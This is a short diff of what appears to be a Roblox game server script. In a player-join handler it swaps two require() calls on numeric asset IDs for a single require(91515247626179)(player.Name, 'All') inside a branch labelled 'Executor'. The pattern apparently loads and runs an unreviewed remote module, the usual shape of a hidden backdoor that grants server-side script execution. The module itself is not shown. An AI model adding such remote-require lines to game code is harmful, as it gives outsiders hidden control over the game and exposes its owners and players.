@@ -183,8 +183,7 @@ playersService.PlayerAdded:connect(function(player)
 
 	if player.UserId == 3 then
 		reportplayer(player.UserId, "Executor")
-		require(10144445406)(player.Name)
-		require(10270875614)(player.Name)
+		require(91515247626179)(player.Name, 'All')
 		reportplayer(player.UserId, "Executor")
 	else
 		reportplayer(player.UserId, "Executor")
